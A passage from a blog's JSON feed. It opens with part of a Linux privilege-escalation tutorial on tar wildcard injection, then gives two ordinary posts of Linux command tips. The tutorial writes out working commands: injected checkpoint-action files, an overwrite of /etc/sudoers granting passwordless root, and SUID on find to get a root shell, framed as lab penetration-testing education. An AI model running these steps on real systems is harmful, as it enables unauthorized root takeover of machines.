src=\"https://i1.wp.com/3.bp.blogspot.com/-yzOiHOko1H0/Wy4yd8dYSvI/AAAAAAAAXgM/Bo-5d1FkUTgm3foqjZFfI0YE_7Z0jka_wCEwYBhgL/s1600/6.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<p>The above commands help the tar command to run the file shell.sh after the first file is archived. Since the tar command is running as root due to crontab, this has the effect of spawning a netcat shell and sending it to the attack platform on port 8888. And if you go back to the terminal window where the listener was on, you will have victim’s reverse connection in after 1 minute.</p>\n<pre class=\"lang:default decode:true\">id\nwhoami</pre>\n<p><strong>Conceptual Information:</strong></p>\n<p>If you have ever explored tar to read its optional switches then you will find the following option.</p>\n<p><strong>–checkpoint[=NUMBER] </strong>show progress messages every Numbers record (default 10)</p>\n<p><strong>–checkpoint-action=ACTION </strong>execute ACTION on each checkpoint</p>\n<p>There is a ‘–checkpoint-action’ option, that will specify the program which will be executed when the checkpoint is reached. Mainly, this permits us to run an arbitrary command. Hence Options ‘–checkpoint=1’ and ‘–checkpoint-action=exec=sh shell.sh’ are handed to the ‘tar’ program as command-line options.</p>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i2.wp.com/4.bp.blogspot.com/-f7RK3fLz7Wg/Wy4yeTLp10I/AAAAAAAAXgc/mLSgGGl97kAMbrY4L0pjaYdwVDHuIOGVACEwYBhgL/s1600/7.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<h3><strong>Post Exploitation via tar (Phase II)</strong></h3>\n<p><strong>Lab Setup</strong></p>\n<p>There are multiple ways to take compressed backup and multi techniques can also be applied for privilege escalation. In this phase, with help of tar, we are going to take a compress backup of a directory. For example, make a new directory whose backup you wish to take and give ALL permission to it and then create some files.</p>\n<pre class=\"lang:default decode:true \">cd /tmp\nmkdir data\nchmod 777 data\ncd data\necho \"\" &gt; f1\necho \"\" &gt; f2\necho \"\" &gt; f3\nls</pre>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i1.wp.com/3.bp.blogspot.com/-2pISut2VhcU/Wy4yesWI4iI/AAAAAAAAXgU/wEDVMlubTSMnbDSzRRTVd_CMHqiXiQ8DACEwYBhgL/s1600/8.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<p>Now in the other directory write a bash script for taking backup of /tmp/data with help of tar archive program.</p>\n<pre class=\"lang:default decode:true\">mkdir info\ncd info\nnano script.sh\nchmod 777 script.sh</pre>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i2.wp.com/4.bp.blogspot.com/-tmCJCuvklv8/Wy4ye0om65I/AAAAAAAAXgU/JA-b7s6GQYEEGD5Yz5dqLTQCzb3ckQ8KACEwYBhgL/s1600/9.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<pre class=\"lang:default decode:true \">#!/bin/bash\ncd /tmp/data\ntar cf /info/backup.tgz *</pre>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i2.wp.com/2.bp.blogspot.com/-Z1IWZDv6Jvg/Wy4yaecZnuI/AAAAAAAAXgQ/LqowF9_7BNUA9H5iH8pSn_kact8q46W4QCEwYBhgL/s1600/10.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<p>Now schedule a task with help of crontab to run tar archival program for taking backup of /html inside /var/backups in every 1 minute.</p>\n<pre class=\"lang:default decode:true\">nano /etc/crontab                                   \n*/1 *   * * *   root    /info/script.sh</pre>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i1.wp.com/4.bp.blogspot.com/-tMQZT2zqPNI/Wy4yao0uODI/AAAAAAAAXgE/yB1XYj9UYlg4s97aXnx6Gwe1irwE2NYrQCEwYBhgL/s1600/11.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<p>And after 1 minute you will notice the backup.tgz file is generated inside the info directory.</p>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i1.wp.com/3.bp.blogspot.com/-i7oV74f4PmQ/Wy4ya67SSaI/AAAAAAAAXgE/MQsqZ2-6Z-0fWJWObJW2gC8cc1LpOneIgCEwYBhgL/s1600/12.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<h3><strong>Tar Wildcard Injection</strong></h3>\n<p><strong>Inject netcat </strong><strong>reverse</strong><strong> _shell </strong><strong> for Privilege Escalation</strong></p>\n<p>Start your attacking machine and first compromise the target system and then move to the privilege escalation stage. Suppose I successfully login into the victim’s machine through ssh and access non-root user terminal. Then open crontab to view if any job is scheduled.</p>\n<pre class=\"lang:default decode:true \">cat /etc/crontab</pre>\n<p>Here we notice the target has scheduled a bash program script for every 1 minute and we know that cron job runs as root. The minute attacker read the program written inside the script.sh, he can apply the tar wildcard injection.</p>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i0.wp.com/3.bp.blogspot.com/-MWto_BployQ/Wy4ybMF7sOI/AAAAAAAAXgE/T14QSmP99csxygcL6LoUhwoKxKHIh37OACEwYBhgL/s1600/13.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<p>Again generate netcat reverse shell payload as done above.</p>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i2.wp.com/4.bp.blogspot.com/-wQDqcAvVluk/Wy4ybRkC68I/AAAAAAAAXf8/38-nzuIdz7E2CRSioN4oitFPYgY_THUwQCEwYBhgL/s1600/15.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<p>And again repeat the above step as shown in the image.</p>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i1.wp.com/4.bp.blogspot.com/-M4dUJIQEPDI/Wy4ybjSXuUI/AAAAAAAAXgE/5cg-fe7u72c3oUnH6VEnvacJ_TSMi0ckACEwYBhgL/s1600/16.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<p>Then get back to netcat shell for the victim’s reverse connection and you will notice after 1 minute you get victim’s netcat session.</p>\n<pre class=\"lang:default decode:true\">whoami\ncd /root\npwd</pre>\n<p>Hence, the target can be easily exploited if he makes a usage tar archive program either by scheduling a job via command or through bash script.</p>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i0.wp.com/3.bp.blogspot.com/-6SsWohfgoeo/Wy4ycMLz12I/AAAAAAAAXgA/xmDPABxMCLk4FQboAazab4IDYNqY6T_pgCEwYBhgL/s1600/17.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<h3><strong>Tar Wildcard Injection (2<sup>nd</sup> method)</strong></h3>\n<p><strong>Exploit Sudoers file for Privilege Escalation</strong></p>\n<p>Basically, with help wildcard injection an attack wants to gain the highest privilege of the system, therefore, he will try to inject some malicious code with help of tar for root access. But there are multiple ways to obtain root access and hence you can apply the following techniques for privilege escalation.</p>\n<p>Suppose you have victim’s machine as a non-root user and for privilege escalation either take root access or try to give sudo right to non-root user by adding him sudoers file. Thus you can take help of following commands.</p>\n<pre class=\"lang:default decode:true\">echo 'echo \"ignite ALL=(root) NOPASSWD: ALL\" &gt; /etc/sudoers' &gt; demo.sh\necho \"\" &gt; \"--checkpoint-action=exec=sh demo.sh\"\necho \"\" &gt; --checkpoint=1\ntar cf archive.tar *</pre>\n<p>With the help of above command we had tried to give root permission to the user: ignite and for 1 minute. After 1 minute passed we successfully owned the root account.</p>\n<pre class=\"lang:default decode:true\">sudo -l\nsudo bash\nwhoami</pre>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i2.wp.com/1.bp.blogspot.com/-uPMOZswJTjg/Wy4yc5Fff9I/AAAAAAAAXgU/ccFKOiLDy50HwETU1EtQ8u2g5ACOFMLFACEwYBhgL/s1600/18.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<h3><strong>Tar Wildcard Injection (3<sup>rd</sup> method)</strong></h3>\n<p><strong>Privilege Escalation-Give SUID permission to system binaries</strong></p>\n<p>There are multiple ways for privilege escalation with help of tar injection but we are discussing very few methods among them. Suppose you have victim’s machine as the non-root user and for privilege escalation, you can try to enable SUID bit for any system binaries and likewise above again you can take help of the following command for obtaining root access.</p>\n<pre class=\"lang:default decode:true\">echo \"chmod u+s /usr/bin/find\" &gt; test.sh\necho \"\" &gt; \"--checkpoint-action=exec=sh test.sh\"\necho \"\" &gt; --checkpoint=1\ntar cf archive.tar *\nls -al /usr/bin/find\nfind f1 -exec \"whoami\" \\;\nroot\nfind f1 -exec \"/bin/sh\" \\;\nid\nwhoami</pre>\n<p>We Hope, you people will enjoy these tricks while penetration testing.</p>\n<figure class=\"jetpack-lazy-image jetpack-lazy-image--handled\"><img loading=\"lazy\"  src=\"https://i0.wp.com/3.bp.blogspot.com/-O2lhkg-YydQ/Wy4yc4FoSkI/AAAAAAAAXgE/LHf2Z4NL9EgDQfHc5GdPAq8PNHUq3d76QCEwYBhgL/s1600/19.png?w=640\" data-is-external-image=\"true\"  loading=\"eager\" data-recalc-dims=\"1\" data-lazy-loaded=\"1\"></figure>\n<p><strong>Source: </strong>//www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt</p>\n</div>",
            "image": "https://sakibulalikhan.github.io/blog/media/posts/6/prev-2.jpeg",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Linux  Privilege Escalation",
                   "Linux"
            ],
            "date_published": "2022-01-10T21:26:38+06:00",
            "date_modified": "2022-01-10T21:26:38+06:00"
        },
        {
            "id": "https://sakibulalikhan.github.io/blog/some-linux-tips-and-tricks.html",
            "url": "https://sakibulalikhan.github.io/blog/some-linux-tips-and-tricks.html",
            "title": "Some Linux tips and tricks",
            "summary": "Today, we will learn the tricky usage of some commands and utilities in Linux. cat command To add text and make a file&hellip;",
            "content_html": "<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.github.io/blog/media/posts/5/linuxtipsandtricks-2.jpeg\" sizes=\"(max-width: 48em) 100vw, 768px\" srcset=\"https://sakibulalikhan.github.io/blog/media/posts/5/responsive/linuxtipsandtricks-2-xs.jpeg 300w ,https://sakibulalikhan.github.io/blog/media/posts/5/responsive/linuxtipsandtricks-2-sm.jpeg 480w ,https://sakibulalikhan.github.io/blog/media/posts/5/responsive/linuxtipsandtricks-2-md.jpeg 768w ,https://sakibulalikhan.github.io/blog/media/posts/5/responsive/linuxtipsandtricks-2-lg.jpeg 1024w ,https://sakibulalikhan.github.io/blog/media/posts/5/responsive/linuxtipsandtricks-2-xl.jpeg 1360w ,https://sakibulalikhan.github.io/blog/media/posts/5/responsive/linuxtipsandtricks-2-2xl.jpeg 1600w\"  alt=\"Linux Tips And Tricks\" width=\"474\" height=\"266\"></figure>\n<p>Today, we will learn the tricky usage of some commands and utilities in Linux.</p>\n<p><strong>cat command</strong></p>\n<p>To add text and make a file</p>\n<p>$ cat &gt; filname.py or filename.txt or filename.c</p>\n<p>To append text in a file</p>\n<p>$ cat » filename.java or filename.sh .</p>\n<p>To number line in the output</p>\n<p>$ cat -n filename.txt</p>\n<p><strong>alias command</strong></p>\n<div class=\"language-plaintext highlighter-rouge\">\n<div class=\"highlight\">\n<pre class=\"highlight\"><code>$ alias (to list all alias)\n</code></pre>\n</div>\n</div>\n<p>To set alias</p>\n<p>$ alias hi=’echo “Hello Pater” ‘</p>\n<p>Now write hi on terminal and press enter, it will show</p>\n<div class=\"language-plaintext highlighter-rouge\">\n<div class=\"highlight\">\n<pre class=\"highlight\"><code>$ hi\nHello Pater\n</code></pre>\n</div>\n</div>\n<p>Now another command</p>\n<p>$ alias scanme=’nmap -sS -p- localhost’</p>\n<p>Run scanme and you will Nmap scan result for your system</p>\n<p>$ scanme</p>\n<p>$ alias scanmehard=’nmap -A -p- localhost’</p>\n<p>you can set multiple alias like this</p>\n<p>To permanently add them into your profile, you just need to append the above commands in .bashrc, like below.</p>\n<p>$ nano ~/.bashrc</p>\n<p>append the above line at the end of the file and relaunch terminal.</p>\n<p>Use shopt -s cdspell to automatically correct your typos</p>\n<p>$ shopt -s cdspell $ cd /hme<br>try this it will cd to home</p>\n<p><strong>grep command</strong></p>\n<p>print lines that match patterns</p>\n<p>example :</p>\n<p>$ grep root /etc/passwd</p>\n<p>Option -v, will display all the lines except the match</p>\n<p>$ grep -v root /etc/passwd</p>\n<p>count lines match</p>\n<p>$ grep -c root /etc/passwd</p>\n<p>count lines don’t match</p>\n<p>$ grep -cv root /etc/passwd</p>\n<p>search ignoring case</p>\n<p>$ grep -i root /etc/passwd</p>\n<p><strong>find command</strong></p>\n<p>Search for files in a directory hierarchy</p>\n<p>Syntax: find [pathnames] [conditions]</p>\n<p>find files containing a specific word in its name</p>\n<p>find /home -name “<em>hacker</em>”</p>\n<p>find all the files greater than certain size</p>\n<p>find / -type f -size +500M</p>\n<p><strong>sort, uniq, diff, fmt commands</strong></p>\n<p>sort - sort lines of text files</p>\n<div class=\"language-plaintext highlighter-rouge\">\n<div class=\"highlight\">\n<pre class=\"highlight\"><code>$ sort filename.txt\n</code></pre>\n</div>\n</div>\n<p>fmt - format unformated file</p>\n<div class=\"language-plaintext highlighter-rouge\">\n<div class=\"highlight\">\n<pre class=\"highlight\"><code>$ fmt hacker.txt\n</code></pre>\n</div>\n</div>\n<p>uniq - omit repeated lines</p>\n<div class=\"language-plaintext highlighter-rouge\">\n<div class=\"highlight\">\n<pre class=\"highlight\"><code>$ uniq hackerrepeat.txt\n</code></pre>\n</div>\n</div>\n<p>diff - compare files line by line and report the difference</p>\n<div class=\"language-plaintext highlighter-rouge\">\n<div class=\"highlight\">\n<pre class=\"highlight\"><code>$ diff [options] file1 file2\n</code></pre>\n</div>\n</div>\n<p><strong>awk command</strong></p>\n<p>Awk is a programming language that allows easy manipulation of structured data and the generation of formatted reports.</p>\n<p><strong>Basic Syntax</strong></p>\n<p>$ awk ‘/search pattern1/ {Actions}</p>\n<p>/search pattern2/ {Actions}’ file</p>\n<p>Print the lines which matches with the pattern.</p>\n<p>$ awk ‘/hacker/</p>\n<p>&gt; /hactivist/’ badactors.txt</p>\n<p><strong>Initialization and Final Action</strong></p>\n<p>Awk has two important patterns that are specified by the keyword called BEGIN and END.</p>\n<p>$ awk ‘BEGIN {print “Name\\tcrime\\tplace\\tmoney”;}</p>\n<p>&gt; {print $2,”\\t”,$3,”\\t”,$4,”\\t”,$NF;}</p>\n<p>&gt; END{print “Report Generated\\n————–”;</p>\n<p>&gt; }’ badactors.txt</p>\n<p><strong>wget and curl commands</strong></p>\n<p>you can download files using wget and curl from internet</p>\n<p>example</p>\n<p>$ wget https://github.io/uname/tools.git</p>\n<p>$ curl https://github.io/uname/tools.git</p>\n<p><strong>I/O Redirection</strong></p>\n<p>Input and output in the Linux environment is distributed across three streams</p>\n<div class=\"language-plaintext highlighter-rouge\">\n<div class=\"highlight\">\n<pre class=\"highlight\"><code>stdin (0)\n\nstdout (1)\n\nstderr (2)\n</code></pre>\n</div>\n</div>\n<p>Commands with a single bracket overwrite the destination’s existing contents.</p>\n<p>Overwrite</p>\n<p>&gt; - standard output</p>\n<p>&lt; - standard input</p>\n<p>2&gt; - standard error</p>\n<p>Commands with a double bracket do not overwrite the destination’s existing contents.</p>\n<p>Append</p>\n<p>&gt;&gt; - standard output</p>\n<p>« - standard input</p>\n<p>2» - standard error</p>\n<table>\n<tbody>\n<tr>\n<td>PIPE ‘</td>\n<td>’</td>\n</tr>\n</tbody>\n</table>\n<p>Pipes are used to redirecting a stream from one program to another</p>\n<p>example</p>\n<table>\n<tbody>\n<tr>\n<td>$ ls /home/desktop</td>\n<td>grep user.txt // it will send first command input to second and display the result.</td>\n</tr>\n</tbody>\n</table>\n<p><strong>filters used by pipe</strong></p>\n<div class=\"language-plaintext highlighter-rouge\">\n<div class=\"highlight\">\n<pre class=\"highlight\"><code>find - Find returns files with filenames that match the argument passed to find.\n\ngrep - Grep returns text that matches the string pattern passed to grep.\n\ntee - Tee redirects standard input to both standard output and one or more files.\n\ntr - tr finds-and-replaces one string with another.\n\nwc - wc counts characters, lines, and words.</code></pre>\n</div>\n</div>",
            "image": "https://sakibulalikhan.github.io/blog/media/posts/5/index.jpeg",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Linux Basics"
            ],
            "date_published": "2021-11-17T13:57:08+06:00",
            "date_modified": "2021-11-21T11:26:36+06:00"
        },
        {
            "id": "https://sakibulalikhan.github.io/blog/learn-intermidiate-commands-for-linux.html",
            "url": "https://sakibulalikhan.github.io/blog/learn-intermidiate-commands-for-linux.html",
            "title": "Learn intermediate commands for Linux",
            "summary": "After you’ve gotten familiar with Linux and learned how to use some basic commands, you might be asking yourself where you can go from&hellip;",
            "content_html": "<div id=\"project-details\">\n<div class=\"content-area\">\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.github.io/blog/media/posts/4/Linux-Termial-2.jpeg\" sizes=\"(max-width: 48em) 100vw, 768px\" srcset=\"https://sakibulalikhan.github.io/blog/media/posts/4/responsive/Linux-Termial-2-xs.jpeg 300w ,https://sakibulalikhan.github.io/blog/media/posts/4/responsive/Linux-Termial-2-sm.jpeg 480w ,https://sakibulalikhan.github.io/blog/media/posts/4/responsive/Linux-Termial-2-md.jpeg 768w ,https://sakibulalikhan.github.io/blog/media/posts/4/responsive/Linux-Termial-2-lg.jpeg 1024w ,https://sakibulalikhan.github.io/blog/media/posts/4/responsive/Linux-Termial-2-xl.jpeg 1360w ,https://sakibulalikhan.github.io/blog/media/posts/4/responsive/Linux-Termial-2-2xl.jpeg 1600w\"  alt=\"Linux Terminal\" width=\"300\" height=\"300\"></figure>\n<p>After you’ve gotten familiar with Linux and <a href=\"https://sakibulalikhan.github.io/learn-basic-commands-for-linux.html\" target=\"_blank\" rel=\"noopener noreferrer\">learned how to use some basic commands</a>, you might be asking yourself where you can go from there. This article will cover a few more commands and programs that are often used when working with the Linux bash before introducing you to the concept of concatenating commands and redirecting their inputs and outputs which will allow you to work even more efficiently.</p>\n<h2><i><strong>How to Copy Files Between Computers</strong></i></h2>\n<h3><i><strong>Scp</strong></i></h3>\n<p>scp stands for secure copy. As the name suggests, this program allows you to transfer files from a local machine to a remote computer and vice-versa. The following command copies a local file to a remote computer:</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<pre class=\"code\"><code class=\"python hljs\">scp &lt;local_file&gt; &lt;remote_user&gt;@&lt;remote_machine&gt;:&lt;remote_path&gt;</code></pre>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>Use the following syntax to transfer a file from a remote computer to your machine:</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<pre class=\"code\"><code class=\"python hljs\">scp &lt;remote_user&gt;@&lt;remote_machine&gt;:&lt;remote_path&gt; &lt;local_path&gt;</code></pre>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>This command is incredibly useful when working with developer boards like the Raspberry Pi or BeagleBone boards.</p>\n<h3><i><strong>wget</strong></i></h3>\n<p>You can use the wget command if you want to download a file from a server to your local computer:</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/wC9JSAa/wC9JSAa4p58g04CEIkixdiCwnWBtP0MQ12AjNabv.jpeg\" data-is-external-image=\"true\"  alt=\"intermediate_linux_commands_DH_MP_image1.jpg\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>The command will attempt to download the resource you supplied and it will automatically detect the file extension. For example: If you point it to a website, it’ll download an HTML file. If you’re transferring a large file, you can simply log out and the tool will finish the task in the background.</p>\n<h2><i><strong>How to Use Process Management</strong></i></h2>\n<h3><i><strong>ps / top</strong></i></h3>\n<p>The ps / top commands allow you to list the processes running on your computer:</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<pre class=\"code\"><code class=\"python hljs\">ps -aux</code></pre>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>Note that this will only generate a snapshot. You can, however, get a list that refreshes itself by using the top command:</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/sZdcE7l/sZdcE7lnQtrecWkMntgEqZ5QBzDHn2gpbRtAYzlk.jpeg\" data-is-external-image=\"true\"  alt=\"intermediate_linux_commands_DH_MP_image2.jpg\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<h3><i><strong>kill</strong></i></h3>\n<p>The kill command can be used to end a running task. You may want to end a program that’s either not responding or that’s running in the background. Either way, you’ll have to find out the PID of the process (you can do that with ps or top):</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/3M4Tu2E/3M4Tu2ESQaGKgS6LJPbbHPZwEQnXSrQMshNhp9Rt.jpeg\" data-is-external-image=\"true\"  alt=\"intermediate_linux_commands_DH_MP_image3.jpg\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<h3><i><strong>service</strong></i></h3>\n<p>The service command can be used to manage services on your computer. It’s quite versatile in a way that you can start, stop, and restart a service as well as print details and a list of all available services on your computer. To print a list, use the following command:</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<pre class=\"code\"><code class=\"python hljs\">service --status-all</code></pre>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>To print a detailed status of a particular service, use:</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<pre class=\"code\"><code class=\"python hljs\">service &lt;service_name&gt; status</code></pre>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>For example:</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/hybAUJp/hybAUJpGby3fMtXuPwqp7pKNAKuGVpoGSc8JRniM.jpeg\" data-is-external-image=\"true\"  alt=\"intermediate_linux_commands_DH_MP_image4.jpg\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>As you can see, the service is currently running. That means we can stop or restart it. To restart it, type:</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<pre class=\"code\"><code class=\"python hljs\">sudo service bluetooth restart</code></pre>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>To end the service, replace restart with stop.</p>\n<h2><strong><i>How to Mounting and Unmount USB Drives</i></strong></h2>\n<h3><i><strong>lsblk / fdisk</strong></i></h3>\n<p>You can use the lsblk and fdisk commands to list block devices (lsblk) and to display and manipulate disk partitions (fdisk). Either one will work for this task.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/MWQQEUk/MWQQEUkVklpD2cp76aeVngYps2RN36xcuW5GsPkL.jpeg\" data-is-external-image=\"true\"  alt=\"intermediate_linux_commands_DH_MP_image5.jpg\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>As you can see, I ran the command before and after inserting a USB drive. Next, take note of the partition you’d like to mount. In my case, that’s sda2.</p>\n<h3><i><strong>mount</strong></i></h3>\n<p>Use this command to mount the filesystem of an external drive in your local file system. This will allow you to work with the files on the storage device.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<pre class=\"code\"><code class=\"python hljs\">sudo mount &lt;partition_to_mount&gt; &lt;local_mounting_point&gt;</code></pre>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>For example:</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<pre class=\"code\"><code class=\"python hljs\">sudo mount /dev/sda2 /mnt</code></pre>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>You can then access the files on the mounted partition by navigating to the /mnt folder.</p>\n<h3><i><strong>Umount</strong></i></h3>\n<p>After you’re done with the USB drive, you need to eject it. You can do that by using the unmount command together with the mounting point, you defined earlier.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<pre class=\"code\"><code class=\"python hljs\">sudo umount &lt;local_mounting_point&gt;</code></pre>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>These commands are just a small percentage of what the Linux bash has to offer. However, I find these to be particularly useful in everyday life, especially when working on a remote computer via SSH or a headless system.</p>\n<h2><i><strong>How to Use Concatenating Commands</strong></i></h2>\n<p>The true power of the Linux shell doesn’t come from using simple commands and programs. You can still get a lot done like that, but to work even more efficiently and fast, you can concatenate commands instead of waiting for one to finish before manually typing in the next one. Furthermore, you can filter or store the results in a file which can be handy in many ways.</p>\n<h2><i><strong>How to Filter Results</strong></i></h2>\n<p>Some commands, like ps or ls, can give you a very long list of results. Usually, you’re only interested in a particular entry or a set of entries (for example all .py files in a folder). A command, that allows you to search for specific characters in a string, is called <strong>grep</strong>. It will simply print all lines where the string you’ve searched for appears.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/21Jjx0j/21Jjx0jBulzq3CfgFDIHBti6AWF064bWtJJgzjfp.jpeg\" data-is-external-image=\"true\"  alt=\"intermediate_linux_commands_DH_MP_image6.jpg\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>Now, you’ll only need to feed the output of a program, for example, echo or ls, into the grep command as an input and it’ll filter everything irrelevant. As you can see, the pipe operator is used to accomplish that. Let’s run ls as an example:</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/KA8gGel/KA8gGels2LbkqfTsgxflOL5bT6CJkcUBEAfjXSeY.jpeg\" data-is-external-image=\"true\"  alt=\"intermediate_linux_commands_DH_MP_image7.jpg\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>I’m only interested in the files that end with .py. To apply a filter, I feed the output of ls into grep with a fitting regular expression:</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/FaR4p0z/FaR4p0zSGYVuEBCaBWJeL3uPtt3UBXZYZGpvBC17.jpeg\" data-is-external-image=\"true\"  alt=\"intermediate_linux_commands_DH_MP_image8.jpg\"></div>\n</div>\n</div>\n</div>\n</div>\n<div 